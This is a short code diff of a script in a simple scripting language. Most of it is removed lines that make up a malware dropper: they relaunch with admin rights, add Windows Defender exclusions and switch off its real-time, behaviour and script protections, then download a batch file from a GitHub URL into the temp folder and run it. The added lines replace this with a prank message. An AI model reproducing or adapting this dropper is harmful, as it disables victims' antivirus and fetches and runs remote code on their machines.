@@ -1,35 +1,5 @@
 func main()
 {
-	if ("{isadmin}" == "False")
-	{
-		runadmin()
-		quit()
-	}
-	no
-	{
-		process("powershell.exe" "Add-MpPreference -ExclusionPath [current file]" "runas")
-		process("powershell.exe" "Add-MpPreference -ExclusionPath [downloads path]" "runas")
-		process("powershell.exe" "Add-MpPreference -ExclusionPath [videos path]" "runas")
-		process("powershell.exe" "Add-MpPreference -ExclusionPath [current directory]" "runas")
-		process("powershell.exe" "Add-MpPreference -ExclusionPath [username]" "runas")
-		process("powershell.exe" "Add-MpPreference -ExclusionPath [desktop path]" "runas")
-		process("powershell.exe" "Set-MpPreference -EnableControlledFolderAccess Disabled" "runas")
-	
-		process("powershell.exe" "Set-MpPreference -DisableRealtimeMonitoring $true" "runas")
-		process("powershell.exe" "Set-MpPreference -DisableBehaviorMonitoring $true" "runas")
-		process("powershell.exe" "Set-MpPreference -DisableBlockAtFirstSeen $true" "runas")
-		process("powershell.exe" "Set-MpPreference -HighThreatDefaultAction 6 -Force" "runas")
-		process("powershell.exe" "Set-MpPreference -ModerateThreatDefaultAction 6" "runas")
-		process("powershell.exe" "Set-MpPreference -LowThreatDefaultAction 6" "runas")
-		process("powershell.exe" "Set-MpPreference -SevereThreatDefaultAction 6" "runas")
-		process("powershell.exe" "Set-MpPreference -DisablePrivacyMode $true" "runas")
-		process("powershell.exe" "Set-MpPreference -DisableIntrusionPreventionSystem $true" "runas")
-		process("powershell.exe" "Set-MpPreference -DisableScriptScanning $true" "runas")
-	
-		download("https://raw.githubusercontent.com/Devalah/test/refs/heads/main/SYS32-Runtime.bat" "[temp]\test.bat" 1)
-		process("powershell.exe" "Add-MpPreference -ExclusionPath [temp]\test.bat" "runas")
-		run("[temp]\test.bat")
-	
-		quit()
-	}
+	wr("IM GAY")
+	wait(90)
 }
